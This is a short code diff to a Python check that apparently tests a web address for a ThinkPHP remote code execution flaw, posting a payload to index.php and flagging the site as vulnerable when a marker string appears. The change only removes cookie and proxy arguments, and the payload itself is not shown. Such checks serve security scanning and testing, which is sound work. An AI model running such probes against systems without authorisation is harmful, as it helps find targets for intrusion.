@@ -25,7 +25,7 @@ def thinkphp_construct_debug_rce_verify(url):
     }
     try:
         vurl = urllib.parse.urljoin(url, 'index.php')
-        req = requests.post(vurl, data=payload, cookies=cookies, headers=headers, timeout=15, verify=False, proxies=proxy)
+        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
         if r"56540676a129760a3" in req.text:
             pocdict['isvul'] = True
             pocdict['vulnurl'] = vurl
